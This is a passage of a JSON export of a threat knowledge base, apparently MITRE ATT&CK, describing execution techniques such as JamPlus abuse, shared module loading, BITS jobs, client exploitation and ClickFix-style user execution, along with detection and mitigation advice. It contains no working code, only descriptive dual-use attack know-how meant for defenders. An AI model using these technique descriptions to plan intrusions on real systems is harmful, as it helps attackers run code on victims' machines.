target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce and Authenticode)</a>"}]},{"id":"T1127.003","name":"JamPlus","description":"Adversaries may use <code>JamPlus</code> to proxy the execution of a malicious script. <code>JamPlus</code> is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio. <a href=\"https://jamplus.github.io/jamplus/quick_start.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JamPlus manual)</a>\n\nAdversaries may abuse the <code>JamPlus</code> build utility to execute malicious scripts via a <code>.jam</code> file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control. <a href=\"https://cyble.com/blog/reputation-hijacking-with-jamplus-a-maneuver-to-bypass-smart-app-control-sac/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyble)</a> <a href=\"https://www.elastic.co/security-labs/dismantling-smart-app-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs)</a>","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Consider blocking or restricting JamPlus if not required."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"JamPlus may not be necessary within a given environment and should be removed if not used."}]}]},{"id":"T1129","name":"Shared Modules","description":"Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux &amp; macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in <code>dlfcn.h</code> in functions such as <code>dlopen</code> and <code>dlsym</code>. Although macOS can execute <code>.so</code> files, common practice uses <code>.dylib</code> files. <a href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Dev Dynamic Libraries)</a> <a href=\"https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Shared Libraries)</a> <a href=\"https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RotaJakiro 2021 netlab360 analysis)</a> <a href=\"https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 OceanLotus 2017)</a>\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in <code>NTDLL.dll</code> and is part of the Windows Native API which is called from functions like <code>LoadLibrary</code> at run time. <a href=\"https://learn.microsoft.com/troubleshoot/windows-client/deployment/dynamic-link-library\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DLL)</a>","detection":"Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software executed through this technique by using application control tools capable of preventing unknown modules from being loaded."}],"subTechniques":[]},{"id":"T1197","name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> <a href=\"https://msdn.microsoft.com/library/aa362813.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITSAdmin)</a>\n\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a> <a href=\"https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mondok Windows PiggyBack BITS May 2007)</a> <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a> BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). <a href=\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PaloAlto UBoatRAT Nov 2017)</a> <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>","detection":"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). <a href=\"https://technet.microsoft.com/library/dd939934.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Issues with BITS July 2011)</a> Active BITS tasks can be enumerated using the BITSAdmin tool (<code>bitsadmin /list /allusers /verbose</code>). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>\n\nMonitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options) <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> Admin logs, PowerShell logs, and the Windows Event log for BITS activity. <a href=\"https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Hunting for Persistence Part 1)</a> Also consider investigating more detailed information about jobs by parsing the BITS job database. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Process: Process Creation","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider limiting access to the BITS interface to specific users or groups. <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Consider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."}],"subTechniques":[]},{"id":"T1203","name":"Exploitation for Client Execution","description":"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","detection":"Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","File: File Modification","Application Log: Application Log Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. <a href=\"https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Blogs Microsoft Edge Sandbox)</a> <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>\n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. Risks of additional exploits and weaknesses in those systems may still exist. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility."},{"id":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."}],"subTechniques":[]},{"id":"T1204","name":"User Execution","description":"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.\n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.\n\nAdversaries may also deceive users into performing actions such as:\n\n* Enabling Remote Access Tools, allowing direct control of the system to the adversary\n* Running malicious JavaScript in their browser, allowing adversaries to Steal Web Session Cookies <a href=\"https://blog.talosintelligence.com/roblox-scam-overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Roblox Scam 2023)</a> <a href=\"https://krebsonsecurity.com/2023/05/discord-admins-hacked-by-malicious-bookmarks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs Discord Bookmarks 2023)</a>\n* Downloading and executing malware for User Execution\n* Coerceing users to copy, paste, and execute malicious code manually <a href=\"https://www.reliaquest.com/blog/new-execution-technique-in-clearfake-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reliaquest-execution)</a> <a href=\"https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: proofpoint-selfpwn)</a>\n\nFor example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Tools. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/caught-beneath-landline-411-telephone-oriented-attack-delivery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Telephone Attack Delivery)</a>","detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":["Linux","Windows","macOS","IaaS","Containers"],"dataSources":["Instance: Instance Start","File: File Creation","Network Traffic: Network Connection Creation","Container: Container Creation","Instance: Instance Creation","Network Traffic: Network Traffic Content","Process: Process Creation","Command: Command Execution","Image: Image Creation","Application Log: Application Log Content","Container: Container Start"],"mitigations":[{"id":"M1017","name":"User Training","description":"Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."},{"id":"M1021","name":"Restrict Web-Based Content","description":"If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files."},{"id":"M1031","name":"Network Intrusion Prevention","description":"If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity."},{"id":"M1033","name":"Limit Software Installation","description":"Where possible, consider requiring developers to pull from internal repositories containing verified and approved packages rather than from external ones."},{"id":"M1038","name":"Execution Prevention","description":"Application control may be able to prevent the running of executables masquerading as other files."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent executable files from running unless they meet a prevalence, age, or trusted list criteria and to prevent Office applications from creating potentially malicious executable content by blocking malicious code from being written to disk. Note: cloud-delivered protection must be enabled to use certain rules. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[{"id":"T1204.001","name":"Malicious Link","description":"An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.","detection":"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."},{"id":"M1021","name":"Restrict Web-Based Content","description":"If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files."},{"id":"M1031","name":"Network Intrusion Prevention","description":"If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity."}]},{"id":"T1204.002","name":"Malicious File","description":"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso. <a href=\"https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Trojanized Windows 10)</a>\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. <a href=\"https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Password Protected Word Docs)</a> \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.","detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."},{"id":"M1038","name":"Execution Prevention","description":"Application control may be able to prevent the running of executables masquerading as other files."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, various Attack Surface Reduction (ASR) rules can be enabled to prevent the execution of potentially malicious executable files (such as those that have been downloaded and executed by Office applications/scripting interpreters/email clients or that do not meet specific prevalence, age, or trusted list criteria). Note: cloud-delivered protection must be enabled for certain rules. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}]},{"id":"T1204.003","name":"Malicious Image","description":"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container. <a href=\"https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Summit Route Malicious AMIs)</a>\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Resource Name or Location). <a href=\"https://info.aquasec.com/hubfs/Threat%20reports/AquaSecurity_Cloud_Native_Threat_Report_2021.pdf?utm_campaign=WP%20-%20Jun2021%20Nautilus%202021%20Threat%20Research%20Report&utm_medium=email&_hsmi=132931006&_hsenc=p2ANqtz-_8oopT5Uhqab8B7kE0l3iFo1koirxtyfTehxF7N-EdGYrwk30gfiwp5SiNlW3G0TNKZxUcDkYOtwQ9S6nNVNyEO-Dgrw&utm_content=132931006&utm_source=hs_automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aqua Security Cloud Native Threat Report June 2021)</a>","detection":"Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.","platforms":["IaaS","Containers"],"dataSources":["Application Log: Application Log Content","Command: Command Execution","Image: Image Creation","Container: Container Start","Container: Container Creation","Instance: Instance Start","Instance: Instance Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be aware of the existence of malicious images and how to avoid deploying instances and containers from them."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network prevention intrusion systems and systems designed to scan and remove malicious downloads can be used to block activity."},{"id":"M1045","name":"Code Signing","description":"Utilize a trust model such as Docker Content Trust with digital signatures to ensure runtime verification of the integrity and publisher of specific image tags. <a href=\"https://docs.docker.com/engine/security/trust/content_trust/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Content trust in Docker)</a> <a href=\"https://docs.microsoft.com/en-us/azure/container-registry/container-registry-content-trust\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Content trust in Azure Container Registry)</a>"},{"id":"M1047","name":"Audit","description":"Audit images deployed within the environment to ensure they do not contain any malicious components."}]},{"id":"T1204.004","name":"Malicious Copy and Paste","description":"An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a Command and Scripting Interpreter. One such strategy is \"ClickFix,\" in which adversaries present users with seemingly helpful solutions—such as prompts to fix errors or complete CAPTCHAs—that instead instruct the user to copy and paste malicious code.\n\nMalicious websites, such as those used in Drive-by Compromise, may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine. <a href=\"https://www.cloudsek.com/blog/unmasking-the-danger-lumma-stealer-malware-exploits-fake-captcha-pages\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSEK Lumma Stealer 2024)</a> <a href=\"https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sekoia ClickFake 2025)</a> <a href=\"https://www.reliaquest.com/blog/using-captcha-for-compromise/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reliaquest CAPTCHA 2024)</a> <a href=\"https://asec.ahnlab.com/en/85699/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AhnLab LummaC2 2025)</a>\n\nAdversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution, consistent with the \"ClickFix\" strategy. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint ClickFix 2024)</a> <a href=\"https://asec.ahnlab.com/en/73952/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AhnLab Malicioys Copy Paste 2024)</a>\n\nTricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"If a link is being requested by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as <code>.scr</code>, <code>.exe</code>, <code>.pif</code>, <code>.cpl</code>, etc."},{"id":"M1031","name":"Network Intrusion Prevention","description":"If a link is being requested by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity."},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., <code>Add-Type</code>). <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell CLM)</a>"}]},{"id":"T1204.005","name":"Malicious Library","description":"Adversaries may rely on a user installing a malicious library to facilitate execution. Threat actors may Upload Malware to package managers such as NPM and PyPi, as well as to public code repositories such as GitHub. User may install libraries without realizing they are malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that establishes persistence, steals data, or mines cryptocurrency. <a href=\"https://securitylabs.datadoghq.com/articles/malicious-pypi-package-targeting-highly-specific-macos-machines/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Datadog Security Labs Malicious PyPi Packages 2024)</a> <a href=\"https://www.fortinet.com/blog/threat-research/malicious-packages-hiddin-in-npm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Malicious NPM Packages 2023)</a>\n\nIn some cases, threat actors may compromise and backdoor existing popular libraries (i.e., Compromise Software Dependencies and Development Tools). Alternatively, they may create entirely new packages and leverage behaviors such as typosquatting to encourage users to install them.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Train developers to be aware of the existence of malicious libraries and how to avoid installing them."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network prevention intrusion systems and systems designed to scan and remove malicious downloads can be used to block activity."},{"id":"M1033","name":"Limit Software Installation","description":"Where possible, consider requiring developers to pull from internal repositories containing verified and approved packages rather than from external ones."}]}]},{"id":"T1559","name":"Inter-Process Communication","description":"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes. <a href=\"https://www.geeksforgeeks.org/inter-process-communication-ipc/#:~:text=Inter%2Dprocess%20communication%20(IPC),of%20co%2Doperation%20between%20them.\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux IPC)</a> Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a>","detection":"Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.","platforms":["Linux","macOS","Windows"],"dataSources":["Module: Module Load","Process: Process Creation","Script: Script Execution","Process: Process Access"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Enable the Hardened Runtime capability when developing applications. Do not include the <code>com.apple.security.get-task-allow</code> entitlement with the value set to any variation of true."},{"id":"M1026","name":"Privileged Account Management","description":"Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}</code> associated with the process-wide security of individual COM applications. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Wide Com Keys)</a>\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Wide Com Keys)</a> <a href=\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM ACL)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs. <a href=\"https://docs.microsoft.com/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 